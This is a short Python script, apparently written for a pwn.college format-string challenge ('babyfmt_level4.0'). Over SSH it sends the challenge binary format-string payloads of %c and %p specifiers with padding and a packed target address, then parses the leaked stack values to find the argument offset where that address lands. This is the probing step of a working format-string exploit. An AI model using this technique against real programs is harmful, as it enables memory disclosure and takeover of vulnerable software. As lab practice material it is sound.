import subprocess, struct
addr=0x404100
for pad in range(8):
    fmt = "AAAA|%142c|%52" + "AAA " + ("%p " * 80)
    payload = fmt.encode() + b"B"*pad + struct.pack("<Q", addr)
    res = subprocess.run(['ssh','-i','../key','hacker@dojo.pwn.college','/challenge/babyfmt_level4.0'], input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out = res.stdout.decode(errors='ignore')
    if 'AAA ' not in out:
        print('pad', pad, 'no AAA marker')
        continue
    after = out.split('AAA ',1)[1]
    line = after.splitlines()[0]
    parts = line.split()
    match_idx = None
    match_val = None
    for i, token in enumerate(parts, start=1):
        if token.lower().startswith('0x404100'):
            match_idx = i
            match_val = token
            break
    print('pad', pad, 'match', match_idx, match_val)
